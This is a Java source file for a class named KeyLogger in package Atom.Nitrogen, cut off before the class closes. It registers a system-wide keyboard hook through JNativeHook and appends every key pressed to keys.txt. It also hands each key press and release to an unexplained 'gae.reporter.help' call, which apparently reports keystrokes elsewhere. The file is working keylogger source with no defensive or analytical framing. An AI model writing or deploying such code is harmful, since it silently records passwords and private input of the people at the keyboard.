package Atom.Nitrogen;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import arc.util.Log;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

    private static final Path file = Paths.get("keys.txt");




    private static void init() {

        Log.info("Key logger has been started");



        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            Log.err(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        gae.reporter.help(keyText);
        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }

        } catch (IOException ex) {
            Log.err(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        gae.reporter.help(keyText);
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
